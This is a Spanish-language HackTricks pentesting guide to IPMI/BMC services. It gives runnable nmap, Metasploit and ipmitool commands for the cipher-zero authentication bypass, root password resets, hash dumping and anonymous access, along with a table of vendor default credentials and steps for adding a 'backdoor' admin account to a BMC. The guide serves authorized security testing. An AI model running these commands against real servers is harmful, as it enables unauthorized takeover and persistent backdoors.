## 623/UDP/TCP - IPMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## InformaciÃ³n bÃ¡sica

La [Interfaz de GestiÃ³n de Plataforma Inteligente](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics) (`IPMI`) es un conjunto de especificaciones estandarizadas para sistemas de gestiÃ³n de host basados en hardware utilizados para la gestiÃ³n y monitorizaciÃ³n del sistema. ActÃºa como un subsistema autÃ³nomo y funciona de forma independiente de la BIOS, CPU, firmware y sistema operativo subyacente del host. IPMI proporciona a los administradores del sistema la capacidad de gestionar y monitorizar sistemas incluso si estÃ¡n apagados o en un estado no receptivo. Opera utilizando una conexiÃ³n de red directa al hardware del sistema y no requiere acceso al sistema operativo a travÃ©s de una shell de inicio de sesiÃ³n. IPMI tambiÃ©n se puede utilizar para actualizaciones remotas de sistemas sin necesidad de acceso fÃ­sico al host de destino. IPMI se utiliza tÃ­picamente de tres maneras:

* Antes de que se haya iniciado el sistema operativo para modificar la configuraciÃ³n de la BIOS.
* Cuando el host estÃ¡ completamente apagado.
* Acceso a un host despuÃ©s de un fallo del sistema.

Cuando no se utiliza para estas tareas, IPMI puede monitorizar una serie de cosas diferentes, como la temperatura del sistema, el voltaje, el estado del ventilador y las fuentes de alimentaciÃ³n. TambiÃ©n se puede utilizar para consultar informaciÃ³n de inventario, revisar registros de hardware y alertar mediante SNMP. El sistema host puede estar apagado, pero el mÃ³dulo IPMI requiere una fuente de alimentaciÃ³n y una conexiÃ³n LAN para funcionar correctamente.

El protocolo IPMI fue publicado por primera vez por Intel en 1998 y ahora es compatible con mÃ¡s de 200 proveedores de sistemas, incluyendo Cisco, Dell, HP, Supermicro, Intel y mÃ¡s. Los sistemas que utilizan la versiÃ³n 2.0 de IPMI pueden ser administrados a travÃ©s de serie sobre LAN, lo que da a los administradores del sistema la capacidad de ver la salida de la consola serie en banda. Para funcionar, IPMI requiere los siguientes componentes:

* Controlador de gestiÃ³n de placa base (BMC) - Un microcontrolador y componente esencial de un IPMI.
* Bus de gestiÃ³n de chasis inteligente (ICMB) - Una interfaz que permite la comunicaciÃ³n de un chasis a otro.
* Bus de gestiÃ³n de plataforma inteligente (IPMB) - extiende el BMC.
* Memoria IPMI - almacena cosas como el registro de eventos del sistema, los datos del repositorio de almacenamiento y mÃ¡s.
* Interfaces de comunicaciones - interfaces de sistema local, interfaces serie y LAN, ICMB y bus de gestiÃ³n PCI.

![](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Puerto predeterminado**: 623/UDP/TCP (normalmente se ejecuta en UDP, pero tambiÃ©n podrÃ­a estar en TCP)

## EnumeraciÃ³n

### Descubrimiento
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Puedes **identificar** la **versiÃ³n** usando:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vulnerabilidad - Bypass de autenticaciÃ³n IPMI a travÃ©s del cifrado 0

Dan Farmer [identificÃ³ una falla grave](http://fish2.com/ipmi/cipherzero.html) en la especificaciÃ³n IPMI 2.0, a saber, que el tipo de cifrado 0, un indicador de que el cliente desea utilizar la autenticaciÃ³n de texto sin formato, en realidad **permite el acceso con cualquier contraseÃ±a**. Se identificaron problemas de cifrado 0 en los BMC de HP, Dell y Supermicro, y es probable que el problema abarque todas las implementaciones de IPMI 2.0.\
Tenga en cuenta que para explotar este problema primero debe **encontrar un usuario vÃ¡lido**.

Puede **identificar** este problema usando:
```
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Y puedes **abusar** de este problema con `ipmitool`:
```bash
apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
```
### Vulnerabilidad - RecuperaciÃ³n remota de hash de contraseÃ±a de autenticaciÃ³n RAKP de IPMI 2.0

BÃ¡sicamente, **puedes solicitar al servidor la sal y el hash MD5 y SHA1 de cualquier nombre de usuario y si el nombre de usuario existe, se enviarÃ¡n de vuelta esos hashes.** SÃ­, tan increÃ­ble como suena. Y hay un **mÃ³dulo de Metasploit** para probar esto (puedes seleccionar el formato de salida en John o Hashcat):
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
_Nota que para esto solo necesitas una lista de nombres de usuario para hacer fuerza bruta (metasploit ya contiene una por defecto)._

Usando `ipmitool` para saltar la autenticaciÃ³n (`-c 0`) y cambiar la contraseÃ±a de root a abc123:
```
root@kali:~# apt-get install ipmitool
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
```
### Vulnerabilidad - AutenticaciÃ³n AnÃ³nima IPMI

AdemÃ¡s de los problemas de autenticaciÃ³n mencionados anteriormente, Dan Farmer seÃ±alÃ³ que **muchos BMC vienen con acceso "anÃ³nimo" habilitado por defecto**. Esto se configura estableciendo el nombre de usuario de la primera cuenta de **usuario** en una **cadena nula** y **estableciendo** una **contraseÃ±a nula** para que coincida. El mÃ³dulo _ipmi\_dumphashes_ identificarÃ¡ y volcarÃ¡ las contraseÃ±as (incluyendo contraseÃ±as en blanco) para cuentas de usuario nulas. **Esta cuenta puede ser difÃ­cil de usar por sÃ­ sola, pero podemos aprovechar `ipmitool` para restablecer la contraseÃ±a de una cuenta de usuario nombrada** y aprovechar esa cuenta para acceder a otros servicios:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to "newpassword"
```
### Vulnerabilidad - ContraseÃ±as en texto claro de IPMI de Supermicro

La especificaciÃ³n IPMI 2.0 exige que el BMC responda a los mÃ©todos de autenticaciÃ³n basados en HMAC como SHA1 y MD5. Este proceso de autenticaciÃ³n tiene algunas debilidades graves, como se ha demostrado en ejemplos anteriores, pero tambiÃ©n **requiere acceso a la contraseÃ±a en texto claro para calcular el hash de autenticaciÃ³n**. Esto significa que el BMC debe almacenar una **versiÃ³n en texto claro** de todas las contraseÃ±as de usuario configuradas en algÃºn lugar de **almacenamiento no volÃ¡til**. En el caso de **Supermicro**, esta ubicaciÃ³n cambia entre las versiones del firmware, pero es **`/nv/PSBlock`** o **`/nv/PSStore`**. Las contraseÃ±as estÃ¡n dispersas entre varios bloques binarios, pero son fÃ¡ciles de identificar ya que siempre siguen al nombre de usuario. Este es un problema grave para cualquier organizaciÃ³n que use contraseÃ±as compartidas entre BMCs o incluso diferentes tipos de dispositivos.
```bash
 cat /nv/PSBlock
  admin                      ADMINpassword^TT                    rootOtherPassword!
```
### Vulnerabilidad - Supermicro IPMI UPnP

Supermicro incluye un **escucha UPnP SSDP en ejecuciÃ³n en el puerto UDP 1900** en el firmware IPMI de muchas de sus placas base recientes. En versiones anteriores a SMT\_X9\_218, este servicio ejecutaba el SDK de Intel para Dispositivos UPnP, versiÃ³n 1.3.1. Esta versiÃ³n es vulnerable a [los problemas que Rapid7 revelÃ³](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) en febrero de 2013, y un exploit para esta plataforma es parte del Metasploit Framework. Lo interesante de este ataque es que **proporciona acceso root completo al BMC**, algo que de otra manera es difÃ­cil de obtener. Tenga en cuenta que un atacante con acceso administrativo, ya sea a travÃ©s de la red o desde una shell root en el sistema host, puede degradar el firmware de un BMC de Supermicro a una versiÃ³n vulnerable y luego explotarlo. Una vez que se **obtiene** el acceso **root**, es posible **leer credenciales en texto claro** desde el sistema de archivos, **instalar** software adicional e integrar **puertas traseras** permanentes en el BMC que sobrevivirÃ­an a una reinstalaciÃ³n completa del sistema operativo del host.
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Fuerza Bruta

Tenga en cuenta que solo HP aleatoriza la contraseÃ±a durante el proceso de fabricaciÃ³n.

| Nombre del producto                                  | Nombre de usuario predeterminado | ContraseÃ±a predeterminada                         |
| ---------------------------------------------------- | -------------------------------- | ------------------------------------------------ |
| **HP Integrated Lights Out (iLO)**                   | Administrador                    | \<cadena aleatoria de 8 caracteres de fÃ¡brica>    |
| **Dell Remote Access Card (iDRAC, DRAC)**            | root                             | calvin                                           |
| **IBM Integrated Management Module (IMM)**           | USERID                           | PASSW0RD (con un cero)                           |
| **Fujitsu Integrated Remote Management Controller**  | admin                            | admin                                            |
| **Supermicro IPMI (2.0)**                            | ADMIN                            | ADMIN                                            |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)**  | root                             | changeme                                         |
| **ASUS iKVM BMC**                                    | admin                            | admin                                            |

## Explotando el Host desde el BMC

Una vez que se obtiene acceso administrativo al BMC, hay varios mÃ©todos disponibles que se pueden utilizar para obtener acceso al sistema operativo del host. El camino mÃ¡s directo es abusar de la funcionalidad KVM del BMC y reiniciar el host a una shell de root (init=/bin/sh en GRUB) o especificar un disco de rescate como una unidad de CD-ROM virtual y arrancar desde allÃ­. Una vez que se obtiene acceso sin procesar al disco del host, es trivial introducir una puerta trasera, copiar datos del disco duro o hacer cualquier cosa que necesite hacerse como parte de la evaluaciÃ³n de seguridad. La gran desventaja, por supuesto, es que el host debe reiniciarse para usar este mÃ©todo. Obtener acceso al host en ejecuciÃ³n es mucho mÃ¡s complicado y depende de lo que estÃ© ejecutando el host. Si la consola fÃ­sica del host se deja iniciada, se vuelve trivial secuestrarla usando la funcionalidad KVM incorporada. Lo mismo se aplica a las consolas serie: si el puerto serie estÃ¡ conectado a una sesiÃ³n autenticada, el BMC puede permitir que este puerto sea secuestrado usando la interfaz ipmitool para serie-over-LAN (sol). Un camino que aÃºn necesita mÃ¡s investigaciÃ³n es abusar del acceso a hardware compartido, como el bus i2c y el chip Super I/O.

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_bios.png)

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_boot.png)

![](<../.gitbook/assets/image (202) (2).png>)

## Explotando el BMC desde el Host

En situaciones en las que se ha comprometido un host con un BMC, se puede utilizar la **interfaz local del BMC para introducir una cuenta de usuario de puerta trasera**, y desde allÃ­ establecer un punto de apoyo permanente en el servidor. Este ataque requiere que **`ipmitool`** estÃ© instalado en el host y que se haya habilitado el soporte del controlador para el BMC. El siguiente ejemplo demuestra cÃ³mo se puede utilizar la interfaz local en el host, que no requiere autenticaciÃ³n, para inyectar una nueva cuenta de usuario en el BMC. Este mÃ©todo es universal en objetivos de Linux, Windows, BSD e incluso DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## Referencias

* [https://blog.rapid7.com/2013/07/02/guia-de-un-pen-tester-para-ipmi/](https://blog.rapid7.com/2013/07/02/guia-de-un-pen-tester-para-ipmi/)
* [https://academy.hackthebox.com/module/112/section/1245](https://academy.hackthebox.com/module/112/section/1245)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
